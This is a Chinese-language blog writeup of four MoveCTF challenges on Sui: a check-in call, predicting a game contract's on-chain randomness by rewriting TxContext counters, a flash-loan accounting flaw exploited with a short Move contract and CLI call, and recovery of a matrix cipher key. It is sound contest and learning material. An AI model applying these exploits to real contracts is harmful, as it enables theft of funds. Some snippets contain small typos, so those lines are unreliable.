---
layout: post
title: Movectf 题解writeup
date: 2022-11-10 14:11:21
categories:
    - writeup
---

> 由 Sui 开发公司 Mysten Labs 支持的首个 MoveCTF（Capture The Flag）安全竞赛包含四道题目，以下是所有题目的题解
>
> 题目源码和题解：https://github.com/chrisyy2003/ctf-writeup/tree/main/MoveCTF



# checkin

 调用entry入口函数从而触发Flag事件

```move

public entry fun get_flag(ctx: &mut TxContext) {
        event::emit(Flag {
            user: tx_context::sender(ctx),
            flag: true
        })
    }
```

调用函数可以通过cli来调用

```move
# get_flag
sui client call --function get_flag --module checkin --package <packageID> --gas-budget 3000
```

# simple_game

> 题目源码：[source code](https://github.com/chrisyy2003/ctf-writeup/tree/main/MoveCTF/simple_game)
> 
> 
> 题解代码：[solve code](https://github.com/chrisyy2003/ctf-writeup/tree/main/MoveCTF/simple_game/solve)
> 

这道题是一个区块链上的游戏，部署时创建了一个Hero，每个英雄具有 200 点体力, 每次与普通怪物战斗消耗 1 点体力，与 Boss 战斗消耗 2 点体力。体力耗尽后，英雄不再能够战斗。

每次击杀怪物后，英雄经验 +1，当英雄经验达到 100 后，可以升级；升级后英雄 HP，strength，defense 均提升；英雄最高等级为 2。英雄等级达到 2 后，可以根据装备稀有度继续刷怪物或者击杀 Boss；击败 Boss 后，有 1% 几率掉落宝箱，最后打开宝箱同样也只有1%几率成功打开。

通过分析得到如果直接去打boss，一个是每次都会扣除2点的体力值，第二是击败后宝箱掉落几率太低。即使运气好击败boss成功掉落，后面打开TreasuryBox同样只有1%的概率，且如果随机数不为0的话宝箱则会丢失。所以需要预测随机数，才能在200的体力的限制下，成功击杀 Boss，保证掉落几率 100%，最后成功打开。

题目的随机数是通过[random](https://github.com/chrisyy2003/ctf-writeup/blob/main/MoveCTF/simple_game/sources/random.move)库实现的，随机数种子是`ctx_bytes`和`uid_bytes`的拼接，`uid_bytes`是sui中object对象中`uid`字段转字节后的值。

```move
fun seed(ctx: &mut TxContext): vector<u8> {
        let ctx_bytes = bcs::to_bytes(ctx);
        let uid = object::new(ctx);
        let uid_bytes: vector<u8> = object::uid_to_bytes(&uid);
        object::delete(uid);

        let info: vector<u8> = vector::empty<u8>();
        vector::append<u8>(&mut info, ctx_bytes);
        vector::append<u8>(&mut info, uid_bytes);

        let hash: vector<u8> = hash::sha3_256(info);
        hash
    }
```

所以如果能够获得当前交易的`ctx_bytes`和新生成的`uid`即可预测seed。

`uid`是由[tx_context](https://github.com/MystenLabs/sui/blob/devnet-0.15.0/crates/sui-framework/sources/tx_context.move#L53)库中的new函数通过ctx参数生成，内部调用了内置`derive_id`函数，`derive_id`通过当前交易的哈希值和`ids_created`拼接生成，`hash(tx_hash || ids_created)`

```move
/// Generate a new, globally unique object ID with version 0
public(friend) fun new_object(ctx: &mut TxContext): address {
        let ids_created = ctx.ids_created;
        let id = derive_id(*&ctx.tx_hash, ids_created);
        ctx.ids_created = ids_created + 1;
        id
    }

/// Native function for deriving an ID via hash(tx_hash || ids_created)
native fun derive_id(tx_hash: vector<u8>, ids_created: u64): address;
```

通过TxContext结构体可以得到，`ids_created`是`TxContext`的内置字段，表示当前交易被创建了多少个对象的一个计数器。

```move
struct TxContext has drop {
        /// A `signer` wrapping the address of the user that signed the current transaction
        signer: signer,
        /// Hash of the current transaction
        tx_hash: vector<u8>,
        /// The current epoch number.
        epoch: u64,
        /// Counter recording the number of fresh id's created while executing
        /// this transaction. Always 0 at the start of a transaction
        ids_created: u64
    }
```

所以，如果能够获得当前交易被创建了多少个对象即可获得下一个`UID`的值，从而知道下一个seed的返回值。

但是函数参数中的`ctx`由于在定义的`TxContext`模块外，Move不能在模块以外直接修改其中的`ids_created`值，所以需要利用[bcs库](https://github.com/MystenLabs/sui/blob/devnet-0.15.0/crates/sui-framework/sources/bcs.move)反序列化`ctx`对象，从而手动修改`ids_created`值。

bcs库主要实现了move中对象的一些序列化和反序列化操作，新建一个bcs对象会使得结构体的存储顺序交换，因为其中会调用`v::reverse(&mut bytes)` ，所以返回结果中首20个字节是地址，紧接着是`tx_hash`，`epoch`，`ids_created`。

```move
let ctx_bytes = bcs::new(bcs::to_bytes(ctx));
let _recover_address = bcs::peel_address(&mut ctx_bytes);
let recover_tx_hash = bcs::peel_vec_u8(&mut ctx_bytes);
let _recover_epoch = bcs::peel_u64(&mut ctx_bytes);
let recover_ = bcs::peel_u64(&mut ctx_bytes);
// 加上对象创建的数量
let ids_created = recover_ids_created + uid_offset;
```

拿到`ids`，加上预测交易中可能创建的对象数，再将新的`ids`和`tx_hash`序列化为`uid`，随后按照题目中的seed的构造方式构造自己的seed即可。

> 需要注意的是，[object::new](https://github.com/MystenLabs/sui/blob/devnet-0.15.0/crates/sui-framework/sources/tx_context.move#L55-L56)时，是先计算id值，后更新id，所以预测的seed实际上是下一次seed的值
> 

最后封装一个`refresh_ctx`函数，每次使得offset的值+1，（也就是创建的对象数+1）去寻找随机数为0的id数。如果为0则跳出循环，并创建刚才循环次数的对象数从而修改ctx中的参数，最后使得合约下一次随机数为0。

此外，在`slay_boar_king`时，源码中创建`monster`时会[调用四次随机数](https://github.com/chrisyy2003/ctf-writeup/blob/main/MoveCTF/simple_game/sources/adventure.move#L69-L72)，所以打boss时需要预测随机数为0的[前四次](https://github.com/chrisyy2003/ctf-writeup/blob/main/MoveCTF/simple_game/solve/sources/main.move#L20)。

此题题解源码：[https://github.com/chrisyy2003/ctf-writeup/tree/main/MoveCTF/simple_game/solve](https://github.com/chrisyy2003/ctf-writeup/tree/main/MoveCTF/simple_game/solve)

# flash loan

> 题目源码：[source code](https://github.com/chrisyy2003/ctf-writeup/tree/main/MoveCTF/flash_loan)
> 
> 
> 题解代码：[solve code](https://github.com/chrisyy2003/ctf-writeup/tree/main/MoveCTF/flash_loan/solve)
> 

本题利用了Hot Potato实现了Move中的闪电贷，关于什么是Hot Potato可以看一下[Move Patterns Hot Potato](https://blog.chrisyy.top/move-patterns/hot-potato.html)。

根据闪电贷的逻辑，每个人可以给`FlashLender`借钱，并且结构题存在一个VecMap记录着每个人存放了多少。

由于逻辑设计的问题，用户可以通过闪电贷来增加自己的存款余额，此外闪电贷的设计是`repay`和`check`余额是分开的，`check`检查余额的时候也是检查整个`Lender`的余额和`Last`的比较，所以导致check消耗我们的`receipt`的时候不需要传入代币，从而可以导致`FlashLender`中记录的值大于实际拥有的值。

所以通过闪电贷借出后再向Lender存款增加余额，最后再提取即可。

```move
entry public fun do(self: &mut FlashLender, ctx: &mut TxContext) {
        let (coin, receipt) = flash::loan(self, 1000, ctx);
        flash::deposit(self, coin, ctx);
        flash::check(self, receipt);
        flash::withdraw(self, 1000, ctx);

        flash::get_flag(self, ctx);
    }
```

最后通过cli调用部署的solve合约，从而获得Flag。

```move
sui client call --function do --module m --package <your_packID> --args <FlashLenderID> --gas-budget 3000
```

# move_lock

> 题目源码：[source code](https://github.com/chrisyy2003/ctf-writeup/tree/main/MoveCTF/move_lock)
>
>
> 题解代码：[solve code](https://github.com/chrisyy2003/ctf-writeup/blob/main/MoveCTF/move_lock/solve.py)

这道题关于一些数学知识。其中最核心是以下代码，通过变量名能够想到$A$是一个$3\times3$的矩阵，通过表达式可以得出其含义为$A$矩阵左乘$P$矩阵，即$AP=C$

```move
let c11 = ( (a11 * p11) + (a12 * p21) + (a13 * p31) ) % 26;
let c21 = ( (a21 * p11) + (a22 * p21) + (a23 * p31) ) % 26;
let c31 = ( (a31 * p11) + (a32 * p21) + (a33 * p31) ) % 26;
```

$$
\left[\begin{array}{ccc}a_{11} & a_{12} & a_{13} \\a_{21} & a_{22} & a_{23} \\a_{31} & a_{33} & a_{33}\end{array}\right]\left[\begin{array}{l}p_{11} \\p_{21} \\p_{31}\end{array}\right]=\left[\begin{array}{l}a_{11} \times p_{11}+a_{12} \times p_{21}+a_{13} \times p_{33} \\a_{21} \times p_{11}+a_{22} \times p_{21}+a_{23} \times p_{33} \\a_{31} \times p_{11}+a_{32} \times p_{21}+a_{33} \times p_{33}\end{array}\right]=\left[\begin{array}{l}c_{11} \\c_{21} \\c_{31}\end{array}\right]
$$

由于$P$矩阵是`complete_plaintext`，`complete_plaintext`前9个已知，所以$P$矩阵已知，$C$矩阵为`encrypted_flag`，前9个同样已知。所以通过sagemath中的[solve_left](https://doc.sagemath.org/html/en/tutorial/tour_linalg.html#linear-algebra)可以求的$A$矩阵即源码中的`key`，求的$A$后由于`complete_plaintext`除前9个以外$P$未均知，但$C$已知，所以通过[solve_right](https://doc.sagemath.org/html/en/tutorial/tour_linalg.html#linear-algebra)再求一次即可。

> 由于`encrypted_flag`输出3个是c矩阵中的列，所以处理`encrypted_flag`时，需要三个一组
并调用`transpose`转置一下
sagamath有在线运行环境：[https://sagecell.sagemath.org/](https://sagecell.sagemath.org/)
> 

此外还有一个不成熟的想法，利用sagemath中的[solve_mod](https://doc.sagemath.org/html/en/reference/calculus/sage/symbolic/relation.html?highlight=solve_mod)直接解一个9元的非线性方程，但是跑了很久没有跑出来，应该是复杂度的问题。